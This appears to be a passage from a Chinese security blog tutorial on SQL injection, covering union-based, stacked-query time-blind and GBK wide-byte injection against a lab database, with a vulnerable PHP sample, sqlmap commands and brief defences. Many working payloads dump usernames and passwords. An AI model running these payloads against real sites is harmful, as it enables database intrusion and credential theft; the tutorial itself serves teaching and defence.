<p>根据SQL注入原理可以得知，这里存在SQL注入漏洞。<br>我们将<code>id=1</code>换成<code>id=2</code>，发现login name 和password都发生了改变，这里就存在我们所说的回显点<br>在这里插入图片描述进行注入首先要判断一下该表的字段数，因为联合注入前后查询的字段数应该保持一样，判断字段的方式最常见的是order by关键字的判断</p>
<p><code>order by</code>原本是排序语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">order</span> <span class="keyword">by</span> n</span><br></pre></td></tr></table></figure>

<p>n 表示select里面的第n个字段，整段sql的意义是：查询出来的结果，按照第N个字段排序<br>不过当N大于该表字段就会报错，根据这个可以使用<code>order by</code>关键字判断字段数</p>
<p>如果字段数较少，还可以通过<code>union select 1，2，3…</code>这样不断测试字段数，当数字大于字段数就会报错。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4 --+</span></span><br></pre></td></tr></table></figure>

<p>在这里插入图片描述<br>此时直接告诉了我们不存在4个字段，那就折一半<br>在这里插入图片描述此时正确回显，所以字段数应该是大于或等于2，小于4。<br>测试一下<code>order by 3</code>，此时也正确回显了，说明该表共有3个字段<br>在这里插入图片描述当我们知道存在3个字段了，又知道存在回显点，此时就可以正式进行联合查询注入<br>我们需要知道查询语句的回显位的位置，可以直接使用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>在这里插入图片描述不过问题来了，按理来说1，2，3这些数字应该会出现在回显位上，可为什么还是出现原来正常的结果呢，其实此时联合查询已经生效了，为了更加清楚的了解这个点我们通过MySQL处理器和代码来弄清楚这个问题</p>
<p>在这里插入图片描述当使用了联合查询之后，1，2，3的结果的确得了出来，但是放在了第二行显示，第一行仍然是<br><code>SELECT * FROM users WHERE id=‘1’ </code>的结果<br>而此处的代码只是输出了第一行的查询结果<br>在这里插入图片描述<br>所以我们需要使得前面的查询语句查询不到结果，这样我们就可以输出第二行的数据了。<br>可以参考一下下面的查询结果，表中无id=0的数据，所以第一行直接输出了联合查询的结果。</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>可以得知在2和3的位置上具有回显位，在上面可以放入我们的查询语句</p>
<p>查询语句得数据<br>这里我们先可以查询一些数据库的相关信息<br>查数据库版本:</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,version() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>得到数据库版本位5.5.53<br>在这里插入图片描述查当前用户：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,user() --+</span></span><br></pre></td></tr></table></figure>

<p>得到当前用户名为root,应该是管理员用户<br>在这里插入图片描述查当前数据库：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,database() --+</span></span><br></pre></td></tr></table></figure>

<p>得到当前数据库名为<code>security</code><br>在这里插入图片描述查文件所在路径</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,@@datadir --+</span></span><br></pre></td></tr></table></figure>

<p>得到路径为D:\phpstudy\MySQL\data<br>在这里插入图片描述这里再补充一些重要的函数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">version()				# mysql 数据库版本</span><br><span class="line">database()				# 当前数据库名</span><br><span class="line"><span class="keyword">user</span>()					# 用户名</span><br><span class="line"><span class="built_in">current_user</span>()			# 当前用户名</span><br><span class="line"><span class="built_in">system_user</span>()			# 系统用户名</span><br><span class="line">@<span class="variable">@datadir</span>				# 数据库路径</span><br><span class="line">@<span class="variable">@version</span>_compile_os	# 操作系统版本</span><br></pre></td></tr></table></figure>

<p>还是查询数据库数据，MySQL里有一个默认数据库information_schema，通过这个数据库可以使得查询事半功倍。<br>还有一些重要的字符串函数需要结合使用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">length()	        	# 返回字符串的长度</span><br><span class="line"><span class="built_in">substring</span>()						</span><br><span class="line">substr()	        	# 截取字符串</span><br><span class="line">mid()</span><br><span class="line"><span class="keyword">left</span>()			        # 从左侧开始取指定字符个数的字符串</span><br><span class="line">concat()	     	   	# 没有分隔符的连接字符串</span><br><span class="line">concat_ws()      		# 含有分割符的连接字符串</span><br><span class="line">group_conat()   		# 连接一个组的字符串</span><br><span class="line">ord()					# 返回ASCII 码</span><br><span class="line">ascii()	</span><br><span class="line">hex()					# 将字符串转换为十六进制</span><br><span class="line">unhex()					# hex 的反向操作</span><br><span class="line">md5()					# 返回MD5 值</span><br><span class="line"><span class="built_in">floor</span>(x)				# 返回不大于x 的最大整数</span><br><span class="line">round()					# 返回参数x 接近的整数</span><br><span class="line">rand()					# 返回<span class="number">0</span><span class="number">-1</span> 之间的随机浮点数</span><br><span class="line">load_file()				# 读取文件，并返回文件内容作为一个字符串</span><br><span class="line">sleep()			        # 睡眠时间为指定的秒数</span><br><span class="line">if(<span class="literal">true</span>,t,f)			# if 判断</span><br><span class="line">find_in_set()			# 返回字符串在字符串列表中的位置</span><br><span class="line">benchmark()				# 指定语句执行的次数</span><br></pre></td></tr></table></figure>

<p>接下来就是爆表名，字段名，和值了<br>爆表名的语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),3 --+ </span></span><br></pre></td></tr></table></figure>

<p>爆字段名的语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;),3 --+</span></span><br></pre></td></tr></table></figure>

<p>爆值语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,(select group_concat(concat(id,0x7e,username,0x3A,password,0x7e)) from users) --+	</span></span><br></pre></td></tr></table></figure>

<p>这里都是采用group_concat连接在一起同时输出的方式进行查询，其实也可以通过limit进行逐条输出<br><code>limit m,n </code>从m条开始，输出n条数据<br>最后，我们就完成了SQL联合注入。</p>
<h2 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h2><h3 id="堆叠查询注入攻击"><a href="#堆叠查询注入攻击" class="headerlink" title="堆叠查询注入攻击"></a>堆叠查询注入攻击</h3><p>堆叠查询注入：堆叠查询可以执行多条SQL语句，语句之间以分号(;)隔开。而堆叠查询注入攻击就是利用此特点，在第二条语句中构造自己要执行的语句。</p>
<p>1）考虑使用堆叠注入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">访问URL:http://www.tianchi.com/web/duidie.php?<span class="built_in">id</span>=1返回正常信息;</span><br><span class="line"></span><br><span class="line">访问URL:http://www.tianchi.com/web/duidie.php?<span class="built_in">id</span>=1<span class="string">&#x27;返回错误信息;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">访问URL:http://www.tianchi.com/web/duidie.php?id=1&#x27;</span>%23返回正常信息;</span><br></pre></td></tr></table></figure>

<p>这里可以使用boolean注入、时间盲注、也可以使用堆叠注入。</p>
<p>2）获取数据库库名</p>
<p>（1）判断当前数据库库名的长度</p>
<p>语句：</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27;;select if(length(database())&gt;=8,sleep(4),1)%23</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http://www.tianchi.com/web/duidie.php?<span class="built_in">id</span>=1<span class="string">&#x27;;select if(length(database())&gt;=8,sleep(4),1)</span></span><br></pre></td></tr></table></figure>

<p>可以看到页面响应时间是5023毫秒，即5.023秒，这说明了页面执行了<code>sleep(4)</code>，也就是<code>length(database())&gt;=8</code>成立。使用Burp的Repeater模块如下所示：</p>
<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918003438.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http://www.tianchi.com/web/duidie.php?<span class="built_in">id</span>=1<span class="string">&#x27;;select if(length(database())&gt;=9,sleep(4),1)</span></span><br></pre></td></tr></table></figure>

<p>可以看到页面响应时间是1026毫秒，即1.026秒，这说明页面没有执行<code>sleep(4)</code>，而是执行了select 1，也就是<code>length(database())&gt;=9</code>是错误的。那么可以确定，当前数据库库名的长度是8。使用Burp的Repeater模块如下所示：<br><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918003445.png" alt="img"></p>
<p>（2）获取当前数据库库名</p>
<p>由于数据库的库名范围一般在a-z,0-9之间，可能有特殊字符，不区分大小写。与boolean注入、时间盲注类似，也使用substr函数来截取database()的值，一次截取一个，注意和limit的从0开始不同，它是从1开始。<br>语句：</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;<span class="keyword">select</span> <span class="keyword">if</span>(substr(database(),<span class="number">1</span>,<span class="number">1</span>)=<span class="symbol">&#x27;a</span>&#x27;,sleep(<span class="number">4</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http://www.tianchi.com/web/duidie.php?<span class="built_in">id</span>=1<span class="string">&#x27;;select if(substr(database(),1,1)=&#x27;</span>s<span class="string">&#x27;,sleep(4),1)%23</span></span><br></pre></td></tr></table></figure>

<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918003453.png" alt="img"></p>
<p>可以看到，当前数据库库名的第一个字符是s，同理可以得到库名是：<code>security</code></p>
<p>3）获取数据库表名</p>
<p>语句：</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;<span class="keyword">select</span> <span class="keyword">if</span>(substr((<span class="keyword">select</span> table_name from information_schema.tables where table_schema=<span class="symbol">&#x27;security</span>&#x27; limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="symbol">&#x27;e</span>&#x27;,sleep(<span class="number">4</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http://www.tianchi.com/web/duidie.php?<span class="built_in">id</span>=1<span class="string">&#x27;;select if(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1)=&#x27;</span>e<span class="string">&#x27;,sleep(4),1)%23</span></span><br></pre></td></tr></table></figure>

<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918003500.png" alt="img"></p>
<p>可以看到<code>security</code>数据库的第一个表名的第一个字符是e。</p>
<p>同理，得到所有字符，最后得到security数据库的第一个表名是：<code>emails</code>。</p>
<p>和时间盲注相同，通过构造不同的时间注入语句，就可以得到完整的数据库库名，表名，字段名和具体数据。</p>
<h3 id="堆叠查询注入PHP代码"><a href="#堆叠查询注入PHP代码" class="headerlink" title="堆叠查询注入PHP代码"></a>堆叠查询注入PHP代码</h3><p>在堆叠注入页面中，程序获取GET参数ID，使用PDO的方式进行数据查询，但仍然将参数ID拼接到查询语句，导致PDO没起到预编译的效果，程序仍然存在SQL注入漏洞。使用PDO执行SQL语句时，虽然可以执行多语句，但是PDO只会返回第一条SQL语句的执行结果，所以第二条语句中需要使用update更新数据或者使用时间盲注获取数据。代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf8&quot;</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$con</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&quot;mysql:host=localhost;dbname=security&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">	<span class="variable">$con</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>,PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">	<span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	<span class="variable">$stmt</span>=<span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from users where id=&#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">	<span class="variable">$result</span>=<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">setFetchMode</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>() <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$v</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$value</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$dsn</span>=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;查询异常！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$con</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="宽字节的由来"><a href="#宽字节的由来" class="headerlink" title="宽字节的由来"></a>宽字节的由来</h3><p>一个字符其大小为一个字节那么我们称其为窄字节<br>那么大小为两个字节的我们称其为宽字节<br>所有的英文默认占一个字节<br>那么中文汉字默认占两个字节<br>例如 gb2312,GBK,GB18030,BIG5,Shift_JIS这些编码都是宽字节<br>英文a-zA-Z共四十八种<br>一个字节都是八位的二进制<br>那么数字的0,1组合起来就有255种但是英文只有48个那么基本应对就绰绰有余<br>但是我们中文汉字才止255个呢所以一个字节是不能满足我们中文汉字的编码需求<br>所以我们的中文，韩文，日文等都需要两个字节来表示（即16位二进制）<br>gbk就是双字节编码占用两个字节<br>UTF-8编码的一个汉字占用三个字节</p>
<h3 id="宽字节注入的原理"><a href="#宽字节注入的原理" class="headerlink" title="宽字节注入的原理"></a>宽字节注入的原理</h3><p>1，宽字节注入主要来自程序员设置数据库编码为非英文编码就有可能产生宽字节注入<br>宽字节sql注入就是php发送请求mysql时使用了语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> names ‘gbk’ <span class="keyword">SET</span> character_set_client<span class="operator">=</span>gbk</span><br></pre></td></tr></table></figure>

<p>进行了依次gbk编码但是又由于一些不经意的字符集导致了宽字节注入<br>2，这个引入一个php防御函数<br><code>magic_quotes_gpc</code>(魔术引号开关)<br><code>magic_quotes_gpc</code>函数在php中的作用是判断用户输入的数据，在<code>post</code>,<code>get</code>,<code>cookie</code>传参中接收到的数据中加转义字符“\”，以确保这些数据不会引起程序出现致命性错误<br>单引号’ 双引号“ 反斜<code>\ </code>null都会被加上反斜线来转义<br>3，magic_quotes_gpc的作用：<br>当php传参中有特殊字符就会在前面加转义字符\来做一定的过滤<br>\4. 为了绕过<code>magic_quotes_gpc</code>的 \ ，于是开始引入宽字节。<br>\：编码%5c 運：编码%df%5c</p>
<h3 id="注入的过程"><a href="#注入的过程" class="headerlink" title="注入的过程"></a>注入的过程</h3><p>1,用order by 排序判断字段数</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%27%20and%201=<span class="number">2</span>%20order%20by%203%23</span><br></pre></td></tr></table></figure>

<p>2，使用联合查询寻找输出点</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span>%df%27%20and%201=<span class="number">2</span>%20union%20select%201,<span class="number">2</span>,<span class="number">3</span>%23</span><br></pre></td></tr></table></figure>

<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918004747.png" alt="img"><br>3，查询数据</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span>%df%27%20and%201=<span class="number">2</span>%20union%20select%201,database(),@@datadir%23</span><br></pre></td></tr></table></figure>

<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918004753.png" alt="img"><br>4，从自带库中查询库中表</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%27%20and%201=<span class="number">2</span>%20union%20select%201,<span class="number">2</span>,group_concat(table_name)from%20information_schema.tables%20where%20table_schema=security%23</span><br></pre></td></tr></table></figure>

<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918004800.png" alt="img"></p>
<p>此处我们将security字符转换成16进制加上0x填入</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%27%20and%201=<span class="number">2</span>%20union%20select%201,<span class="number">2</span>,group_concat(table_name)from%20information_schema.tables%20where%20table_schema=<span class="number">0x7365637572697479</span>%23</span><br></pre></td></tr></table></figure>

<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918004806.png" alt="img"></p>
<h3 id="如何修复"><a href="#如何修复" class="headerlink" title="如何修复"></a>如何修复</h3><ul>
<li>1，使用UTF-8编码格式，避免宽字节注入</li>
<li>ps:不仅在gbk,韩文，日文等等都是宽字节，都可能存在宽字节注入漏洞。</li>
<li>2，mysql_real_escape_string,mysql_set_charset(‘gbk’,$conn);针对查询语句直接加入过滤</li>
<li>3，可以设置参数，character_set_client=binary</li>
</ul>
<h1 id="SQL注入利用工具"><a href="#SQL注入利用工具" class="headerlink" title="SQL注入利用工具"></a>SQL注入利用工具</h1><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><ul>
<li>SQLMAP：<br><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></li>
<li>JSQL：<br><a target="_blank" rel="noopener" href="https://github.com/ron190/jsql-injection">https://github.com/ron190/jsql-injection</a></li>
</ul>
<h2 id="SQLMAP常用命令"><a href="#SQLMAP常用命令" class="headerlink" title="SQLMAP常用命令"></a>SQLMAP常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://test.com/sql1.php?user=<span class="built_in">test</span>&amp;<span class="built_in">id</span>=1 --dbs</span><br></pre></td></tr></table></figure>

<p>-u 指定检测的URL地址 –dbs列出数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://test.com/sql1.php&quot;</span> --data=<span class="string">&quot;user=test&amp;id=1&quot;</span> -p <span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p>–data post参数 –p 指定参数注入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://test.com/sql1.php&quot;</span> --data=<span class="string">&quot;user=test&amp;id=1&quot;</span> -p <span class="built_in">id</span> --D mysql –tables</span><br></pre></td></tr></table></figure>

<p>获取指定数据库的表名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://test.com/sql1.php&quot;</span> --data=<span class="string">&quot;user=test&amp;id=1&quot;</span> -p <span class="built_in">id</span> --D mysql -T user –columns</span><br></pre></td></tr></table></figure>

<p>获取指定数据库及指定表的列名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://test.com/sql1.php&quot;</span> --data=<span class="string">&quot;user=test&amp;id=1&quot;</span> -p <span class="built_in">id</span> --D mysql -T user --dump</span><br></pre></td></tr></table></figure>

<p>dump数据</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-r c:\sqltest.txt  </span></span><br></pre></td></tr></table></figure>

<p>加载请求数据</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">--cookie</span>=COOKIE  </span><br></pre></td></tr></table></figure>

<p>登录后的cookie</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">--proxy</span>=<span class="string">&quot;http://127.0.0.1:8080&quot;</span>  </span><br></pre></td></tr></table></figure>

<p>使用HTTP代理</p>
<h1 id="防御SQL注入漏洞"><a href="#防御SQL注入漏洞" class="headerlink" title="防御SQL注入漏洞"></a>防御SQL注入漏洞</h1><p>这些危害包括但不局限于：</p>
<ul>
<li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</li>
<li>网页篡改：通过操作数据库对特定网页进行篡改。</li>
<li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li>
<li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li>
<li>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li>
<li>破坏硬盘数据，瘫痪全系统。</li>
</ul>
<p>一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大。</p>
<p><strong>过滤特殊字符</strong>：<br>单引号、双引号、斜杠、反斜杠、冒号、空字符等的字符</p>
<p><strong>过滤的对象</strong>:<br>用户的输入<br>提交的URL请求中的参数部分<br>从cookie中得到的数据<br>部署防SQL注入系统或脚本</p>
<p><strong>参考链接</strong>：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/santtde/article/details/91353746">https://blog.csdn.net/santtde/article/details/91353746</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/askta0/p/9201840.html">https://www.cnblogs.com/askta0/p/9201840.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html">https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/southwind0/category_8097787.html">https://blog.csdn.net/southwind0/category_8097787.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/stem/p/11681090.html">https://www.cnblogs.com/stem/p/11681090.html</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">TYsec</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/posts/9b311c28.html/">http://example.com/posts/9b311c28.html/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">TYsec</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917143714.3oip218ppug0.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/d5e8fca.html/"><img class="prev-cover" src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20230402/1.6xawu1bglk80.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">pwn入门刷题记录（一）</div></div></a></div><div class="next-post pull-right"><a href="/posts/b0baaa51.html/"><img class="next-cover" src="https://s2.loli.net/2023/02/24/qyE2b1PNZzGrnSM.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">基于Ubuntu16.04同时部署多道pwn题目</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/f19d15b1.html/" title="sqlmap的简单使用"><img class="cover" src="https://s2.loli.net/2023/06/15/gMqywsQlIK3OCmu.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-16</div><div class="title">sqlmap的简单使用</div></div></a></div><div><a href="/posts/ff7f37e6.html/" title="联合注入"><img class="cover" src="https://s2.loli.net/2023/06/14/uRCcDTJPghl3tW6.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-16</div><div class="title">联合注入</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=2142516016&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">TYsec</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div 